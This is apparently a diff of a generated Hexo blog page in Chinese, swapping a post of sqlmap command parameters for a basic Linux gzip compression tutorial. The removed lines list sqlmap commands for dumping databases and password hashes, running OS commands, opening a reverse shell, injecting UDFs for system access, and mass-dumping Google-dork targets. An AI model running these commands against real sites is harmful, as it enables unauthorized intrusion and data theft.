@@ -4,27 +4,18 @@
   <meta charset="utf-8">
   
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
-  <title>SQLMAP常用参数 | Hexo</title>
+  <title>Linux常用命令（1） | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="#获取当前用户名称sqlmap -u “http://url?id=1“ - -current-user 
-#获取当前数据库名称sqlmap -u “http://url?id=1“ - -current-db 
-#列出给定数据库的所有表sqlmap -u “http://url?id=1“ -D “db_name” - -tables 
-#列出指定库和指定表的所有列sqlmap -u “http">
+  <meta name="description" content="文件的压缩常见的压缩文件扩展名123456*.Z         compress 程序压缩的文件；*.gz        gzip 程序压缩的文件；*.bz2       bzip2 程序压缩的文件；*.tar       tar 程序打包的数据，并没有压缩过；*.tar.gz    tar 程序打包的文件，其中并且经过 gzip 的压缩*.tar.bz2   tar 程序打包的文件，其中并且经">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SQLMAP常用参数">
-<meta property="og:url" content="http://yoursite.com/2016/05/22/SQLMAP常用参数/index.html">
+<meta property="og:title" content="Linux常用命令（1）">
+<meta property="og:url" content="http://yoursite.com/2016/08/04/Linux常用命令/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="#获取当前用户名称sqlmap -u “http://url?id=1“ - -current-user 
-#获取当前数据库名称sqlmap -u “http://url?id=1“ - -current-db 
-#列出给定数据库的所有表sqlmap -u “http://url?id=1“ -D “db_name” - -tables 
-#列出指定库和指定表的所有列sqlmap -u “http">
-<meta property="og:updated_time" content="2016-07-23T13:37:31.104Z">
+<meta property="og:description" content="文件的压缩常见的压缩文件扩展名123456*.Z         compress 程序压缩的文件；*.gz        gzip 程序压缩的文件；*.bz2       bzip2 程序压缩的文件；*.tar       tar 程序打包的数据，并没有压缩过；*.tar.gz    tar 程序打包的文件，其中并且经过 gzip 的压缩*.tar.bz2   tar 程序打包的文件，其中并且经">
+<meta property="og:updated_time" content="2016-08-04T09:11:37.483Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="SQLMAP常用参数">
-<meta name="twitter:description" content="#获取当前用户名称sqlmap -u “http://url?id=1“ - -current-user 
-#获取当前数据库名称sqlmap -u “http://url?id=1“ - -current-db 
-#列出给定数据库的所有表sqlmap -u “http://url?id=1“ -D “db_name” - -tables 
-#列出指定库和指定表的所有列sqlmap -u “http">
+<meta name="twitter:title" content="Linux常用命令（1）">
+<meta name="twitter:description" content="文件的压缩常见的压缩文件扩展名123456*.Z         compress 程序压缩的文件；*.gz        gzip 程序压缩的文件；*.bz2       bzip2 程序压缩的文件；*.tar       tar 程序打包的数据，并没有压缩过；*.tar.gz    tar 程序打包的文件，其中并且经过 gzip 的压缩*.tar.bz2   tar 程序打包的文件，其中并且经">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -206,11 +197,11 @@
 	</div>
 </nav>
 
-      <div class="body-wrap"><article id="post-SQLMAP常用参数" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-Linux常用命令" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2016/05/22/SQLMAP常用参数/" class="article-date">
-  	<time datetime="2016-05-22T03:15:14.000Z" itemprop="datePublished">2016-05-22</time>
+      <a href="/2016/08/04/Linux常用命令/" class="article-date">
+  	<time datetime="2016-08-04T03:31:41.979Z" itemprop="datePublished">2016-08-04</time>
 </a>
     </div>
   
@@ -223,7 +214,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      SQLMAP常用参数
+      Linux常用命令（1）
     </h1>
   
 
@@ -239,30 +230,12 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>#获取当前用户名称<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -current-user </p>
-<p>#获取当前数据库名称<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -current-db </p>
-<p>#列出给定数据库的所有表<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ -D “db_name” - -tables </p>
-<p>#列出指定库和指定表的所有列<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ -D “db_name” -T “tablename” - -columns </p>
-<p>#获取指定数据库指定表指定列的内容<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ -D “db_name” -T “table_name” -C “column_name1,column_name2” - -dump </p>
-<p>#确定是否为DBA<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -is-dba </p>
-<p>#查看权限<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -privileges </p>
-<p>#获取所有数据库用户密码<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -passwords </p>
-<p>#列出指定用户数据库密码<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -passwords -U username </p>
-<p>#列出所有数据库用户角色<br> sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -roles </p>
-<p>#列出所有数据库用户<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -users </p>
-<p>#列出所有数据库名<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -dbs </p>
-<p>#查看指定用户权限<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -privileges -U username </p>
-<p>#导出所有数据库所有表<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -dump-all </p>
-<p>#导出指定字段的20条数据<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ -D “db_name” -T “tablename” -C “password,user,id” - -dump - -start 1 - -stop 20 </p>
-<p>#导入用户自定义函数（获取系统权限！）<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -udf-inject </p>
-<p>#post注入<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -data “id=3”</p>
-<p>#代理注入<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -proxy “<a href="http://127.0.0.1:8118" target="_blank" rel="external">http://127.0.0.1:8118</a>“</p>
-<p>#执行系统命令<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -os-cmd=whoami </p>
-<p>#系统交互<br>shellsqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -os-shell </p>
-<p>#执行指定sql命令<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -sql-shell </p>
-<p>#反弹shell<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -os-pwn </p>
-<p>#读取win系统注册表<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -reg-read </p>
-<p>#google搜索注入点自动跑出所有字段攻击实例<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ -g “Google dork” - -dump-all - -batch</p>
+        <h2 id="文件的压缩"><a href="#文件的压缩" class="headerlink" title="文件的压缩"></a>文件的压缩</h2><h3 id="常见的压缩文件扩展名"><a href="#常见的压缩文件扩展名" class="headerlink" title="常见的压缩文件扩展名"></a>常见的压缩文件扩展名</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">*.Z         compress 程序压缩的文件；</div><div class="line">*.gz        gzip 程序压缩的文件；</div><div class="line">*.bz2       bzip2 程序压缩的文件；</div><div class="line">*.tar       tar 程序打包的数据，并没有压缩过；</div><div class="line">*.tar.gz    tar 程序打包的文件，其中并且经过 gzip 的压缩</div><div class="line">*.tar.bz2   tar 程序打包的文件，其中并且经过 bzip2 的压缩</div></pre></td></tr></table></figure>
+<h3 id="文件压缩命令gzip"><a href="#文件压缩命令gzip" class="headerlink" title="文件压缩命令gzip"></a>文件压缩命令gzip</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">[root@www ~]<span class="comment"># gzip [-cdtv#] 档名</span></div><div class="line">[root@www ~]<span class="comment"># zcat 档名.gz</span></div><div class="line">选项与参数：</div><div class="line">-c  ：将压缩的数据输出到萤幕上，可透过数据流重导向来处理；</div><div class="line"><span class="_">-d</span>  ：解压缩的参数；</div><div class="line">-t  ：可以用来检验一个压缩档的一致性～看看文件有无错误；</div><div class="line">-v  ：可以显示出原文件/压缩文件的压缩比等资讯；</div><div class="line">-<span class="comment">#  ：压缩等级，-1 最快，但是压缩比最差、-9 最慢，但是压缩比最好！默认是 -6</span></div></pre></td></tr></table></figure>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
 
       
     </div>
@@ -272,18 +245,18 @@
     
 <nav id="article-nav">
   
-    <a href="/2016/08/04/Linux常用命令/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2016/08/04/更改yum源/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption"><</strong>
       <div class="article-nav-title">
         
-          Linux常用命令（1）
+          更改yum源
         
       </div>
     </a>
   
   
-    <a href="/2016/04/21/Github的搭建/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Github的搭建</div>
+    <a href="/2016/05/22/SQLMAP常用参数/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">SQLMAP常用参数</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -318,7 +291,7 @@
 
 <div class="duoshuo">
 	<!-- 多说评论框 start -->
-	<div class="ds-thread" data-thread-key="SQLMAP常用参数" data-title="SQLMAP常用参数" data-url="http://yoursite.com/2016/05/22/SQLMAP常用参数/"></div>
+	<div class="ds-thread" data-thread-key="Linux常用命令" data-title="Linux常用命令（1）" data-url="http://yoursite.com/2016/08/04/Linux常用命令/"></div>
 	<!-- 多说评论框 end -->
 	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
 	<script type="text/javascript">
